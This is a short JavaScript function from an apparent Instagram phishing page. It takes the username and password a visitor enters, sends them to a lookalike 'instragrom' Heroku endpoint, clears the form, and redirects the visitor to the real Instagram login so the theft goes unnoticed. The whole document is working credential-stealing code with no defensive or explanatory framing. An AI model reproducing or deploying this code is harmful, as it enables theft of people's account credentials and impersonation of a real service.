  async function x (){
let username = document.getElementById("user");
let password = document.getElementById("pass");

const data = {
    "username" : username.value,
    "password" : password.value
}
const options = {
    
    method:'POST',
    headers:{
        'Content-Type':'application/json'
        
    },
    body: JSON.stringify(data)
};

await fetch(
    'https://instragrom.herokuapp.com/user', options
)

// https://instragrom.herokuapp.com/user
username.value="";
password.value="";
window.location.href="https://www.instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav";


}
